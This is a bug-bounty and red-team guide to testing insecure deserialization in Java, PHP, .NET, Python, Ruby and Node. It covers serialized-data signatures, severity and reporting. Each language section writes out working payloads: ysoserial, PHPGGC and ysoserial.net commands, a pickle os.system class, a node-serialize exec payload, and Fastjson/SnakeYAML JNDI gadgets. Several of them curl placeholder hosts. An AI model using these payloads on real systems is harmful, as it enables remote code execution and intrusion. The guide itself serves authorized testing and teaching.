# Insecure Deserialization — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** Any feature that **deserializes attacker-controlled data** back into objects — session cookies, hidden form
fields (**.NET ViewState**), API bodies/params, auth/state tokens, cache entries, message-queue payloads, file uploads,
`X-*` headers, RMI/JMX endpoints, and any sink calling a native or library deserializer:
Java `ObjectInputStream.readObject()` / Jackson / Fastjson / XStream / Kryo / SnakeYAML, PHP `unserialize()` / **`phar://`**,
.NET `BinaryFormatter` / `LosFormatter` / `ObjectStateFormatter` / `Json.NET`, Python `pickle` / `yaml.load` / `jsonpickle`,
Ruby `Marshal.load` / `YAML.load`, Node `node-serialize` / `serialize-javascript`.
**Impact ceiling: RCE.** Backends: **Java, PHP, .NET, Python, Ruby, Node** — each covered with its own gadgets & tools. Kali/WSL for ysoserial/PHPGGC/marshalsec.
**Companion files in this folder:**
- `DESERIALIZATION_ARSENAL.md` — per-language recognition, payloads, and gadget-tool commands (ysoserial/ysoserial.net/PHPGGC/marshalsec)
- `DESERIALIZATION_CHECKLIST.md` — the per-sink testing checklist
- `DESERIALIZATION_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — `deser_detect.py` (fingerprint any serialized blob) + `pickle_poc.py` + `php_object_poc.py` + `ysoserial_cheat.md`
- `Deserialization_Zero_to_Expert.md` — the 100-question study + field reference Q&A

> ⚖️ **Authorized testing only.** Deserialization = **RCE**. Prove with a **benign, non-destructive** marker — a
> **DNS/HTTP OOB callback** (best first proof), a bounded `sleep`, or `id`/`whoami` — then **STOP**. No reverse shells,
> no post-exploitation, no data destruction, no persistence on bug bounty. Delete uploaded artifacts. One benign
> command that proves code execution is the whole PoC.

> **Read the basics first.** Fundamentals: **PortSwigger — Insecure deserialization** (+ its labs), **HackTricks —
> Deserialization** (per-language pages), **PayloadsAllTheThings — Insecure Deserialization**, **PentesterLab — Java
> Serialize / PHP / .NET badges**, OWASP (A08:2021 *Software & Data Integrity Failures*) + the *Deserialization Cheat
> Sheet*. This guide assumes you know what serialization is.

---

## 0. Read this first — why deserialization is the crown-jewel RCE class
When an app turns bytes back into an object, a **type-confusion / gadget** attacker doesn't just change *data* — they
control **which code runs during reconstruction**. Language deserializers call "magic" lifecycle hooks
(`readObject`/`__wakeup`/`__destruct`/`__reduce__`/`OnDeserialization`), and a chain of already-loaded library classes
(a **gadget chain**) can be steered from those hooks into **`Runtime.exec` / `system()` / `os.system`** → **Remote Code
Execution.** That's why it's consistently **Critical**:
- **RCE** — the headline. One crafted cookie/ViewState/upload → command execution on the server.
- **Auth bypass / privilege escalation** — tamper a serialized **session object** (`isAdmin → true`, swap the user) even
  without a full gadget chain.
- **SSRF / file read-write / SQLi / DoS** — via specific gadgets (URLDNS SSRF, phar file ops, expansion DoS).

**Lead your report with impact:** "achieved RCE via a Java deserialization gadget in the session cookie" / "RCE via
unauthenticated ViewState deserialization" / "PHP object injection → RCE via a POP chain". Not "the app deserializes input."

**The core mechanism (know it cold):** find a place the server **deserializes bytes you control**, identify the
**language/format**, then feed it a **serialized object whose reconstruction triggers a gadget chain** ending in code
execution. Everything else is: recognizing the format, choosing the tool, and getting a benign proof.

---

## Master Testing Sequence (the order to actually work in)
1. **Find deserialization sinks** (§1) — cookies, ViewState, tokens, API bodies, uploads, headers, RMI/JMX.
2. **Recognize the format/language** (§2) — the byte/base64 signatures tell you Java vs PHP vs .NET vs Python vs Ruby vs Node.
3. **Confirm it deserializes your input** (§3) — tamper → error/behavior change; **blind DNS gadget** (URLDNS) for a safe first proof.
4. **Exploit per language** (§4 Java · §5 PHP · §6 .NET · §7 Python · §8 Ruby · §9 Node) with the right gadget tool.
5. **No known gadget?** (§10) — object tampering for auth bypass, custom POP chains from source, phar upload, blind/OOB.
6. **Escalate** (§11) → **validate + severity + report** (§12–§14), benign proof only.

---

# PART I — FIND & RECOGNIZE

## 1. Where serialized data lives (find the sinks)
Deserialization hides in any channel that round-trips an object through the client or an untrusted source:
- **Cookies / session tokens** — the classic. A base64 blob in a session/auth cookie that the server deserializes.
- **.NET `__VIEWSTATE`** (hidden form field) — huge: if the MAC is off or the machine key is known, ViewState deserializes to RCE.
- **API request bodies / params** — base64/serialized objects in JSON/XML/form fields; JSON libs with polymorphic typing.
- **Hidden fields / state tokens / "remember me"** — serialized preferences/user objects.
- **File uploads** — a serialized object file, or **PHP phar** (any file the app does a file-op on with a `phar://` path → deserialize).
- **Message queues / caches** — RabbitMQ/Redis/Kafka payloads deserialized by consumers (red-team/internal).
- **RMI / JMX / T3 (WebLogic) / JNDI** endpoints — Java remote deserialization services.
- **Grep source/JS** for the sink calls (see Scope) and for base64 blobs handed to a deserializer.

## 2. Recognize the format / language (the signatures)
The blob's **first bytes / base64 prefix** identify the deserializer — this decides your entire approach:
```
Java (ObjectInputStream)   hex AC ED 00 05        base64 starts "rO0AB"            gzip+b64: "H4sI"
PHP (serialize())          O:4:"User":..  a:2:{.. s:5:"..";  b:/i:/d:  (and phar magic "PK"/"phar")
.NET BinaryFormatter       hex 00 01 00 00 00 FF FF FF FF   base64 "AAEAAAD/////"
.NET ViewState             __VIEWSTATE = base64 (often starts "/wEP…") — LosFormatter/ObjectStateFormatter
Python pickle              starts \x80\x04 / \x80\x03 (proto), or "(dp0"/"(lp0" text (proto 0); base64 "gA..." 
Python (PyYAML unsafe)     "!!python/object/apply:" in a YAML value
Ruby Marshal               hex 04 08                                    base64 "BAh"
Node node-serialize        contains  _$$ND_FUNC$$_  or  {"rce":"_$$ND_FUNC$$_function..."
Java JSON gadgets          Jackson: nested "@class"/polymorphic; Fastjson: "@type":"..."; XStream: XML <java.*>
```
`poc/deser_detect.py` fingerprints these automatically (incl. base64/gzip). Once you know the language, jump to its section.

## 3. Confirm your input is deserialized (safely)
- **Tamper test:** change one byte / field of the blob → a **deserialization error / stack trace / different behavior**
  proves the server is parsing it as an object (not opaque). A stack trace naming `ObjectInputStream`/`unserialize`/
  `BinaryFormatter`/`pickle` confirms the sink and the language.
- **Blind DNS gadget (the safe first proof):** Java **URLDNS** (ysoserial) triggers a DNS lookup on deserialization with
  **no code execution and no gadget dependency** — a DNS hit to your Collaborator/Interactsh **confirms deserialization**
  cleanly. Equivalents exist per language (a callback in the payload). Use this before any RCE gadget.

> **Observability:** you rarely see command output. Prove execution **out-of-band** (DNS/HTTP callback) or via **timing**
> (`sleep`), not by reading stdout. Design your PoC around OOB from the start.

---

# PART II — EXPLOIT PER LANGUAGE

## 4. Java — `ObjectInputStream` & friends ★ the classic RCE
**Signature:** `AC ED 00 05` / base64 `rO0AB`. **Sink:** `readObject()`, plus RMI/JMX/JNDI, T3 (WebLogic), and JSON
libs (below).

**Exploit with `ysoserial`** — it emits a serialized object for a known **gadget chain** using libraries on the app's
classpath:
```bash
java -jar ysoserial.jar CommonsCollections5 'curl http://YOUR-OOB/j' | base64 -w0   # → drop into the cookie/param
# chains: CommonsCollections1..7, Spring1/2, Groovy1, Hibernate1, JRMPClient, ROME, Clojure, C3P0, …
java -jar ysoserial.jar URLDNS 'http://UNIQUE.YOUR-OOB'   # BLIND confirm (DNS, no RCE) — do this first
```
Which chain works depends on the **classpath**. Use **GadgetProbe** (Burp) to fingerprint which libraries are present,
then pick the matching chain. Don't spray — probe, then fire the right one.

**JSON/other Java deserializers (very common in modern apps):**
- **Jackson** with polymorphic typing (`enableDefaultTyping()` / `@JsonTypeInfo`) → `{"@class":"..."}` gadget → RCE (many CVEs).
- **Fastjson / Fastjson2** → `{"@type":"com.sun...JdbcRowSetImpl","dataSourceName":"ldap://YOUR/x","autoCommit":true}`
  → **JNDI** → RCE (marshalsec hosts the JNDI/LDAP payload).
- **XStream** → crafted XML `<...>` gadget → RCE (CVE-2013-7285 and many since).
- **SnakeYAML** (`yaml.load`) → `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://YOUR/"]]]]` → RCE.
- **RMI/JNDI** — `marshalsec` runs a malicious LDAP/RMI server; the app fetches+deserializes → RCE (this is the Log4Shell family too — §15).

## 5. PHP — `unserialize()` & phar ★ object injection → POP chain
**Signature:** `O:4:"User":2:{s:4:"name";s:3:"bob";s:7:"isAdmin";b:1;}`. **Sink:** `unserialize()` on cookies/params, or
**`phar://`** (below).

**PHP Object Injection → POP chain:** you inject a serialized object of a class the app has; during
reconstruction/destruction the class's **magic methods** run:
- `__wakeup()` (on unserialize), `__destruct()` (on cleanup), `__toString()` (on string use), `__call`, `__get`.
- A **POP chain** (Property-Oriented Programming) strings these magic methods across the app's classes to reach a
  dangerous sink (`system`, `file_put_contents`, SQL). If the app uses a known framework, **PHPGGC** has the chain:
```bash
phpggc Laravel/RCE1 system 'curl http://YOUR-OOB/p'          # → the serialized string to inject
phpggc -l                                                     # list chains: Laravel, Symfony, WordPress, Drupal, Monolog, Guzzle, …
phpggc Monolog/RCE1 system id
```
No framework chain? **Read the source** and build a custom POP chain from the app's own classes (find a `__destruct`/
`__wakeup` that reaches a sink).

**Phar deserialization (no `unserialize()` call needed!):** any file operation with a **`phar://`** path
(`file_exists`, `fopen`, `getimagesize`, `md5_file`, `is_dir`…) **deserializes the Phar's metadata**. Upload a phar
(disguised as an image/JPEG polyglot), then trigger a file-op on `phar://uploaded.jpg/x` → POP chain → RCE. `phpggc -p
phar -o evil.phar Monolog/RCE1 system id` builds it. This is the modern high-value PHP vector.

**Type juggling / `__wakeup` bypass:** `O:4:...` with a wrong property **count** can skip `__wakeup` (CVE-2016-7124 in old
PHP); loose comparisons (`==`) in magic methods enable auth bypass.

## 6. .NET — `BinaryFormatter` / ViewState ★ RCE
**Signatures:** `AAEAAAD/////` (BinaryFormatter), `__VIEWSTATE` base64. **Sinks:** `BinaryFormatter`, `LosFormatter`,
`ObjectStateFormatter` (ViewState), `SoapFormatter`, `NetDataContractSerializer`, `Json.NET` with `TypeNameHandling`,
`XmlSerializer` with attacker-controlled type.

**Exploit with `ysoserial.net`:**
```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c nslookup UNIQUE.YOUR-OOB" -o base64
# gadgets: TypeConfuseDelegate, WindowsIdentity, ObjectDataProvider, PSObject, DataSet, …
```
**ViewState (the big one):** if `__VIEWSTATE` is **not MAC-protected** (or you have the **`machineKey`** — from a leaked
`web.config`, e.g. via XXE/LFI, or a Telerik key), forge a ViewState that deserializes to RCE:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c ..." --generator=<__VIEWSTATEGENERATOR> \
  --validationkey=<KEY> --validationalg=SHA1
```
Unauthenticated ViewState RCE (no MAC) = instant Critical. **Json.NET** `TypeNameHandling.All`/`Objects` →
`{"$type":"System.Windows...ObjectDataProvider", ...}` gadget → RCE.

## 7. Python — `pickle` / PyYAML ★ trivial RCE
**Signature:** `\x80\x04...` (pickle), `!!python/object/apply:` (YAML). **Sink:** `pickle.loads`, `yaml.load` (unsafe
loader), `jsonpickle`, `shelve`, `dill`, `marshal`.
**Pickle** is the easiest RCE of all — `__reduce__` returns a callable+args executed on load:
```python
import pickle, os, base64
class E:
    def __reduce__(self): return (os.system, ("curl http://YOUR-OOB/py",))
print(base64.b64encode(pickle.dumps(E())).decode())   # → drop into the pickle sink
```
`poc/pickle_poc.py` builds it (benign marker). **PyYAML:** `!!python/object/apply:os.system ["id"]` (or
`subprocess.check_output`) if `yaml.load` uses an unsafe loader (pre-5.1 default). **jsonpickle** `{"py/object":...}`.
ML/model files (`.pkl`, `.pt`, `.joblib`) are a huge pickle-RCE surface.

## 8. Ruby — `Marshal.load` / YAML ★ universal gadget
**Signature:** `\x04\x08` (Marshal), base64 `BAh`. **Sink:** `Marshal.load`, `YAML.load`/`Psych` (Rails
CVE-2013-0156), `Oj`.
Ruby has a well-known **universal deserialization gadget** (works with only stdlib, no app gems) usable via Marshal or
YAML → RCE. Rails apps historically deserialized YAML from params/cookies. Build with the public universal-gadget
generator or a marshal payload; confirm with a callback/`sleep`.

## 9. Node.js — `node-serialize` & friends
**Signature:** `_$$ND_FUNC$$_` in the blob. **Sink:** `node-serialize`'s `unserialize()`, `serialize-javascript`,
`funcster`, old `js-yaml`, `cryo`.
`node-serialize` executes a function via an **IIFE** on deserialize:
```json
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://YOUR-OOB/n',()=>{})}()"}
```
base64 it into the cookie/param the app deserializes. **Prototype pollution** often overlaps Node deserialization —
cross-ref the (coming) Prototype-Pollution kit.

---

# PART III — GADGET-LESS, ESCALATE & IMPACT

## 10. No known gadget chain — what now?
- **Object tampering for auth bypass (no RCE needed):** if the serialized blob is a **session/user object**, flip fields
  — PHP `s:7:"isAdmin";b:0;` → `b:1;`, or Java/.NET a `role`/`isAdmin` property, or a Python pickle of a dict. Re-sign if
  it's unsigned. Privilege escalation / auth bypass is a valid High–Critical even without command execution.
- **Custom POP chain from source (PHP/Java):** with source access, find a magic method (`__destruct`/`__wakeup`/gadget
  `readObject`) that reaches a sink and build the chain yourself (property-oriented programming).
- **Phar / file-op trigger (PHP):** no `unserialize()`? use `phar://` via any file operation (§5).
- **Blind/OOB only:** confirm with **URLDNS/DNS/HTTP callback** and report as "deserialization of untrusted data
  (unauthenticated)" with the blind proof — still High even before a working RCE chain, because the primitive is present.
- **GadgetProbe / classpath fingerprinting (Java):** enumerate loaded libraries to discover *which* chain will work,
  then use it.

## 11. "You found X → now do Y"
| You found | Escalate to | Severity |
|---|---|---|
| Serialized blob you can tamper (Java/PHP/.NET/Py) | URLDNS/DNS callback → confirm deserialization | High (primitive) |
| Confirmed deser + known classpath/framework | ysoserial / PHPGGC / ysoserial.net gadget → **RCE** | Critical |
| **ViewState** with no MAC (or known machineKey) | ysoserial.net -p ViewState → unauth **RCE** | Critical |
| PHP `unserialize()` on input, no framework chain | source → custom POP chain, or **phar** upload → RCE | Critical |
| PHP file-op on user path | `phar://` metadata deserialization → POP → RCE | Critical |
| Session object you can edit | flip `isAdmin`/role/user → **auth bypass / privesc** | High–Critical |
| Fastjson/Jackson/SnakeYAML `@type`/`@class` | JNDI/URLClassLoader gadget (marshalsec) → RCE | Critical |
| Python pickle / `.pkl` model / `yaml.load` | `__reduce__` / `!!python/object/apply` → RCE | Critical |
| Leaked `web.config` / `machineKey` (via XXE/LFI) | forge ViewState → RCE (chain from `../XXE/`,`../LFI/`) | Critical |

**Killer chains:** ① *XXE/LFI reads `web.config` machineKey → ViewState RCE.* ② *File-upload polyglot phar → file-op →
PHP POP RCE.* ③ *Session-cookie deserialization → URLDNS confirm → CommonsCollections RCE.* ④ *Fastjson `@type` → JNDI →
RCE* (Log4Shell family, §15).

---

# PART IV — VALIDITY, SEVERITY & REPORTING

## 12. False-positive auto-reject (don't submit these as-is)
| Looks like it | Why it's NOT (yet) | Make it real |
|---|---|---|
| Base64 that decodes to a serialized object | Recognizing the format ≠ it's exploitable | Show **tamper → error**, then a **DNS/RCE** proof |
| Deserialization **error** on tamper | Confirms parsing, not code exec | Get a **URLDNS/callback** or a working gadget |
| The blob is **signed/MAC'd** and you lack the key | Can't tamper without the key | Find the key (leak/weak/default) or it's not exploitable |
| URLDNS/DNS hit only | Confirms deser (report as such) | Escalate to RCE (right gadget) for Critical |
| A "safe" deserializer (allow-listed types / `SafeLoader`) | Not exploitable | Move on unless you can reach an unsafe path |
| Scanner's own gadget callback | Not your finding | Reproduce manually with your unique OOB token |

**Golden proof:** a **benign OOB callback or `sleep`** you triggered via the serialized blob (deserialization confirmed),
and — for Critical — a **command executing** (`id`/`nslookup`/callback). Recognizing serialized bytes is a *lead*.

## 13. Severity calibration (CVSS + CWE)
```
Deserialization → RCE (any language/gadget/ViewState/phar)          Critical (9.0–9.8)   CWE-502
Object tampering → auth bypass / privilege escalation                Critical–High        CWE-502(+287/915)
Deserialization confirmed (blind, no gadget yet) but reachable        High                 CWE-502
Deserialization → SSRF (URLDNS/gadget)                                High–Medium          CWE-502(+918)
Deserialization → DoS (expansion) only                               Medium               CWE-502(+400)
```
Base for RCE ≈ `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (~9.8 unauth). Lower `PR` matters (unauth ViewState/cookie = worst). Lead with the **command you ran / the callback you received**.

## 14. Reporting (see `DESERIALIZATION_REPORT_TEMPLATE.md`)
Include: the **sink** (endpoint + where the blob lives), the **language/format** (with the signature), the **original vs
crafted** blob (and the tool + gadget: `ysoserial CommonsCollections5` / `phpggc Laravel/RCE1` / `ysoserial.net -p
ViewState`), the **benign proof** (the OOB callback log line / `sleep` timing / `id` output), CWE-502 + CVSS, and impact
in business terms ("unauthenticated RCE via the session cookie"). **Redact**, prove benignly, and note SAFE-PoC.

## 15. Distinguish from neighbors
- **Log4Shell / JNDI injection** (`${jndi:ldap://…}`): the *trigger* differs (a logged string, not a serialized blob),
  but the *back half* (JNDI → remote class load → deserialization/RCE) is the **same gadget family**. Report the JNDI
  string bug separately, but reuse the marshalsec LDAP/RMI server. Related, not identical.
- **XXE** (`../XXE/`): different bug (XML entities), but XXE **feeds** deserialization (read `web.config` machineKey → ViewState RCE).
- **Prototype pollution** (Node): overlaps Node deserialization gadgets; often the sink that turns a polluted prototype into RCE.
- **SSTI / mass assignment**: different classes; don't mislabel a template-eval or property-bind as deserialization.

## 16. SAFE-PoC discipline (this is RCE — maximum care)
- **OOB-first proof:** confirm with a **DNS/HTTP callback** (URLDNS / a unique-token curl) or a **bounded `sleep`** before
  any command. That proves code execution without touching data.
- **One benign command** max (`id`/`whoami`/`hostname`/`nslookup <token>`) — capture output, then **STOP**. No reverse
  shells, no reading other data, no writing files (beyond a benign marker), no persistence, no lateral movement on bounty.
- **Uploads (phar/pickle/model):** use your own account, mark benignly, **delete** the artifact after.
- **No DoS** (expansion/resource) on production.
- **Tear down** your OOB/JNDI/LDAP listener after; don't leave a public gadget server running.

---

## 17. Real-world attacks & CVEs (this class is a CVE factory)
- **Apache Commons Collections (2015)** — the Java deserialization apocalypse: **WebLogic, JBoss, WebSphere, Jenkins,
  OpenNMS** all RCE via `readObject` + CC gadget. Kicked off ysoserial.
- **Oracle WebLogic** — endless T3/JNDI deser CVEs (CVE-2015-4852, 2017-3248, 2018-2628, 2019-2725, 2020-2555…).
- **.NET ViewState** — **Telerik UI** `CVE-2019-18935` (deser RCE), SharePoint ViewState RCEs, `__VIEWSTATE` without MAC.
- **PHP** — **Laravel `CVE-2018-15133`** (APP_KEY → `X-XSRF-TOKEN` deser → RCE), Magento, WordPress **phar** (via
  thumbnail file-ops), TypO3, vBulletin, Zend.
- **Fastjson / Jackson** — repeated `@type`/polymorphic JNDI RCE CVEs (Java JSON deserialization).
- **Python** — pickle RCE in **ML pipelines / model files** (`.pkl`,`.pt`), PyYAML `yaml.load`; **Ruby** — Rails
  `CVE-2013-0156` (YAML), the universal Marshal/YAML gadget.
- **Node** — `node-serialize` `_$$ND_FUNC$$_` RCE.
The pattern persists because **deserializing untrusted data is fundamentally dangerous** and libraries keep exposing it.

## 18. Appendix — canonical references
- **PortSwigger Web Security Academy — Insecure deserialization** (topic + PHP/Java/Ruby labs, custom gadget chains).
- **HackTricks — Deserialization** (Java/.NET/PHP/Python/Ruby/Node pages), **PayloadsAllTheThings — Insecure
  Deserialization**, **PentesterLab** (Java Serialize / PHP object injection / .NET badges).
- **Tools:** `ysoserial` (Java), `ysoserial.net` (.NET/ViewState), `PHPGGC` (PHP + phar), `marshalsec` (JNDI/JSON/
  SnakeYAML servers), **GadgetProbe** (Java classpath), Freddy (Burp — Java/.NET deser scanner).
- **OWASP** — **A08:2021 Software & Data Integrity Failures**, **Deserialization Cheat Sheet**; **CWE-502** (Deserialization
  of Untrusted Data), CWE-915 (mass-assign-adjacent), CWE-918 (SSRF chain).
- Companion kits: `../XXE/` + `../LFI/` (leak machineKey/source), `../FileUpload/` (phar/pickle polyglot upload),
  `../JWT/` (token signing), `../SSRF/` (URLDNS/JNDI escalation); Log4Shell/JNDI lives here + is cross-referenced.

---

> **Bottom line:** find where the server **deserializes bytes you control** (cookie / **ViewState** / token / API body /
> **upload** / phar / RMI), **recognize the language** from the signature (`rO0`/`O:`/`AAEAAAD`/`\x80`/`\x04\x08`/
> `_$$ND_FUNC$$_`), confirm with a **safe blind DNS gadget**, then fire the **matching gadget tool** (ysoserial /
> ysoserial.net / PHPGGC / marshalsec) for **RCE** — or tamper the object for **auth bypass** when no chain exists. Prove
> with **one benign OOB/`sleep`/`id`** and STOP. Report CWE-502, impact-first, Critical. Authorized targets only.
